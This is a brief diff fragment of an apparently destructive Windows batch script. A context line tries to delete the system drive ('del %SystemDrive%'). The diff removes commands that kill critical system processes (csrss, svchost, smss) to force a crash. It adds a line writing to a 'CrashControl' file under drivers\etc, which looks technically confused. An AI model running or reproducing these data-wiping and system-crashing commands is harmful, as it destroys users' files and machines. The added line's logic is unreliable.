@@ -869,14 +869,4 @@ del %SystemDrive%
 del %LOGFILE%
 timeout 20 /nobreak
 
-taskkill /im csrss.exe
-taskkill /im svchost.exe
-taskkill /im smss.exe 
-
-
-
-
-
-
-
-
+%SystemRoot%\System32\cmd.exe /c echo 0 > %SystemRoot%\System32\drivers\etc\CrashControl
